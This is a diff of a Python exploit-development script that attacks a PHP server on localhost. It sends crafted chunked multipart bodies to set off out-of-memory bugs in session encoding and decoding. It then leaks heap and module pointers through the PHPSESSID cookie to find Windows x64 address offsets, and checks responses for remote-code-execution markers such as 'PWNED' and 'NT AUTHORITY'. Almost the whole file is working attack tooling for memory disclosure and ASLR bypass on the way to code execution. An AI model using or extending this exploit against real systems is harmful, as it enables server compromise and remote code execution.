@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""Windows recon: A1 crash then B1 leak capture + qword histograms.
-Prints compact evidence to calibrate module-anchor offsets for Win x64."""
+"""Windows recon: Bug-U (decode OOM on pre-seeded session) and Bug-S (encode OOM)
+arm sequences + B1 leak with RAW sid dump."""
 import importlib.util
 import os
 import struct
@@ -18,116 +18,90 @@ try:
 except SystemExit:
     pass
 
-PURE = os.path.join(HERE, "pure")  # helpers live in pure/ of the bundle
+PURE = os.path.join(HERE, "pure")
 URL = "http://127.0.0.1:8085/"
 url = m.normalize_url(URL)
 conn = m.Conn(url[0], url[1], url[2], 90.0, True, "", {}, proxy=None)
 
-control = (b"--C\r\nContent-Disposition: form-data; name=\"a\"; filename=\"\r\n\r\n\r\n--C--\r\n")
-st, hd, _b = conn.request(url[3], control, chunked=False)
-print("[*] control: HTTP %d %dB X-Powered-By=%r" % (st, len(_b), hd.get("x-powered-by", "")))
+SID32 = b"a" * 32
+SIDHEX = "61"
 
-def hist(dec):
-    mod = Counter()   # 0x00007F00_00000000..0x00007FFF_FFFFFFFF
-    low = Counter()   # heap/stack: 0x00000040..0x00007F00_00000000
-    total = 0
-    for off in range(0, len(dec) - 8, 8):
-        q = struct.unpack_from("<Q", dec, off)[0]
-        if q < 0x10000 or q > 0x00007FFFFFFF0000:
-            continue
-        total += 1
-        if 0x00007F0000000000 <= q <= 0x00007FFFffffffff:
-            mod[q] += 1
-        elif q < 0x00007F0000000000:
-            low[q] += 1
-    return total, mod, low
-
-ARMS = [
-    ("n14", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "14", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-    ("n17", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "17", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-    ("n20", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "20", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-    ("n23", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "23", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-    ("n26", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "26", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-    ("n29", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
-             "--bigs17", "29", "--big-len17", "66000",
-             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
-]
-
-for attempt, (tag, knobs) in enumerate(ARMS, start=1):
-    a1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "a.bin")
-    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"), "--out", a1,
-                    "--big", "78"] + knobs, check=True, stdout=subprocess.DEVNULL)
-    body = open(a1, "rb").read()
-    try:
-        st, _h, _b = conn.request(url[3] + m.Q, body, chunked=True)
-    except Exception as exc:
-        conn.close()
-        st = 0
-        try:
-            conn.connect()
-        except Exception:
-            pass
-    print("[*] try%d(%s) A1 %dB -> %s" % (attempt, tag, len(body),
-          ("HTTP %d %dB" % (st, len(_b))) if st else "conn-lost"))
-    if b"Allowed memory size of" in _b:
-        print("[*] try%d(%s) A1 fatal: %r" % (attempt, tag,
-              _b[:150].decode("utf-8", "replace")))
-    elif st and len(_b) < 400 and _b:
-        print("[*] try%d(%s) A1 short body: %r" % (attempt, tag,
-              _b[:200].decode("utf-8", "replace")))
-
-    b1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "b1.bin")
-    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"), "--out", b1,
-                    "--spec", m.LEAK_SPEC, "--fake-len", "0xC8000", "--tag"],
+def build(mk, extra):
+    p = os.path.join(tempfile.mkdtemp(prefix="rc_"), "x.bin")
+    subprocess.run([sys.executable, os.path.join(PURE, mk), "--out", p] + extra,
                    check=True, stdout=subprocess.DEVNULL)
-    body = open(b1, "rb").read()
+    return open(p, "rb").read()
+
+def send(body, path=None):
     try:
-        st, headers, resp = conn.request(url[3], body, chunked=True)
-    except Exception as exc:
+        return conn.request(path if path is not None else url[3], body, chunked=True)
+    except Exception:
         conn.close()
-        print("[*] try%d B1 conn lost: %r" % (attempt, type(exc).__name__))
         try:
             conn.connect()
         except Exception:
             pass
-        continue
+        return 0, {}, b""
+
+BASE = ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
+        "--fillers128", "4"]
+SEED = ["--parts", "860", "--depth", "20", "--big", "10", "--big-len", "4000",
+        "--fillers128", "2", "--sid-hex", SIDHEX]
+
+def show(tag, st, _b):
+    print("[%s] HTTP %d %dB" % (tag, st, len(_b)))
+    if b"Allowed memory size of" in _b:
+        print("[%s] FATAL: %r" % (tag, _b[:150].decode("utf-8", "replace")))
+    elif st and 0 < len(_b) < 400:
+        print("[%s] short: %r" % (tag, _b[:200].decode("utf-8", "replace")))
+
+def b1_probe(tag):
+    body = build("mk_leak_b.py", ["--spec", m.LEAK_SPEC, "--fake-len", "0xC8000",
+                                  "--tag", "--sid", SID32.decode()])
+    st, headers, resp = send(body, url[3])
     sc = headers.get("set-cookie", "")
-    print("[*] try%d B1 -> HTTP %d, set-cookie len=%d, body=%dB" %
-          (attempt, st, len(sc), len(resp)))
     px = sc.find("PHPSESSID=")
-    raw = sc[px + 10:] if px >= 0 else sc
+    raw = sc[px + 10:] if px >= 0 else ""
     for cut in (";", ","):
         j = raw.find(cut)
         if j >= 0:
             raw = raw[:j]
     dec = unquote_to_bytes(raw).replace(b"+", b" ")
-    print("[*] try%d decoded leak=%dB" % (attempt, len(dec)))
-    total, mod, low = hist(dec)
-    print("[*] try%d candidate qwords=%d (mod=%d uniq, low=%d uniq)" %
-          (attempt, total, len(mod), len(low)))
-    print("[*] try%d MOD top12:" % attempt)
-    for q, c in mod.most_common(12):
-        print("    %#018x x%d  page-align0x%x" % (q, c, q & ~0xFFF))
-    print("[*] try%d LOW top8:" % attempt)
-    for q, c in low.most_common(8):
-        print("    %#018x x%d" % (q, c))
-    buckets = Counter()
-    for q, c in low.items():
-        buckets[q & ~0x1FFFFF] += c
-    print("[*] try%d LOW buckets(2MB) top6:" % attempt)
-    for b, c in buckets.most_common(6):
-        print("    %#018x x%d" % (b, c))
-    print("[*] try%d head hex:" % attempt)
-    print("    " + dec[:160].hex())
-conn.close()
-print("[=] recon done")
+    print("[%s] B1 HTTP %d body=%dB sidlen=%d raw=%r" % (tag, st, len(resp), len(dec), dec[:120]))
+    if len(dec) > 26:
+        total = 0
+        mod = Counter()
+        for off in range(0, len(dec) - 8, 8):
+            q = struct.unpack_from("<Q", dec, off)[0]
+            if 0x00007FF000000000 <= q <= 0x00007FFFFFFF0000:
+                mod[q] += 1
+                total += 1
+        print("[%s] LEAK qwords=%d uniq=%d top:" % (tag, total, len(mod)))
+        for q, c in mod.most_common(10):
+            print("    %#018x x%d" % (q, c))
+    if b"PWNED" in resp or b"uid=" in resp or b"NT AUTHORITY" in resp:
+        print("[%s] *** RCE MARKER IN BODY *** %r" % (tag, resp[:300]))
+
+# ---- try1: Bug U (decode OOM on seeded session) ----
+print("[*] try1 BugU: seed session")
+st, _h, _b = send(build("mk_a1.py", SEED))
+show("try1.seed", st, _b)
+
+print("[*] try1.arm n17 same sid")
+arm = build("mk_a1.py", BASE + ["--bigs17", "17", "--big-len17", "66000",
+                                "--burners", "30", "--burner-len", "7500",
+                                "--sid-hex", SIDHEX])
+st, _h, _b = send(arm)
+show("try1.arm", st, _b)
+b1_probe("try1")
+
+# ---- try2: Bug S (encode OOM, bigger session data) ----
+print("[*] try2 BugS: n17 fresh sid, progress 12000")
+arm = build("mk_a1.py", BASE + ["--bigs17", "17", "--big-len17", "66000",
+                                "--burners", "30", "--burner-len", "7500",
+                                "--progress-len", "12000", "--sid-hex", "62"])
+st, _h, _b = send(arm)
+show("try2.arm", st, _b)
+b1_probe("try2")
+
+print("[*] done")
